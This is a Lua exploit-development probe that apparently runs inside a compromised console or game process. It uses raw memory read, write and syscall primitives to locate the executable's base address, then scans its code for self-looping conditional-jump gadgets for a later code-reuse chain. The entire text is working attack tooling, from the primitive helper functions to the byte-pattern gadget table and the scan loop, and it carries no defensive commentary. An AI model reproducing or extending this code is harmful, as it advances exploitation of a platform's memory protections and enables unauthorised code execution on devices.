-- CRASH_CLASS: LOW
-- PROBE 913b: a barrier needs a BACKWARD conditional jump for a self-loop.
-- cmp [rdi],0 ; je -6 is the minimal wait-for-nonzero. Scan eboot for exact
-- self-loop encodings; also accept jne forms for wait-for-zero.
print("=== PROBE 913b: self-loop gadget scan ===")
local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local pats={
 {"cmp_d0_je_loop", string.char(0x83,0x3F,0x00,0x74,0xFA)},
 {"cmp_d0_jne_loop",string.char(0x83,0x3F,0x00,0x75,0xFA)},
 {"cmp_q0_je_loop", string.char(0x48,0x83,0x3F,0x00,0x74,0xF9)},
 {"cmp_q0_jne_loop",string.char(0x48,0x83,0x3F,0x00,0x75,0xF9)},
 {"mov_test_je_loop",string.char(0x8B,0x07,0x85,0xC0,0x74,0xF8)},
 {"mov_test_jne_loop",string.char(0x8B,0x07,0x85,0xC0,0x75,0xF8)},
 {"cmp_a0_je_loop", string.char(0x83,0x38,0x00,0x74,0xFA)},
 {"cmp_a0_jne_loop",string.char(0x83,0x38,0x00,0x75,0xFA)},
}
local function scan(pat,limit,hits)
    local off=0
    while off<limit do
        local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(ebase+off,want) end)
        if not ok or type(s)~="string" then break end
        local pos=1
        while true do
            local i=string.find(s,pat,pos,true)
            if not i then break end
            hits[#hits+1]=ebase+off+i-1
            if #hits>=3 then return end
            pos=i+1
        end
        off=off+want
    end
end
local total=0
for _,p in ipairs(pats) do
    local hits={}
    scan(p[2],0x494000,hits)
    total=total+#hits
    for _,a in ipairs(hits) do
        local ok,bytes=pcall(function() return memory.read_buffer(a,8) end)
        local hex=""
        if ok and type(bytes)=="string" then
            for k=1,8 do hex=hex..string.format("%02X ",string.byte(bytes,k)) end
        end
        print(string.format("  %s @ %X : %s",p[1],a,hex))
    end
    if #hits==0 then print("  "..p[1].." : none") end
end
print("[Z] total hits="..total)
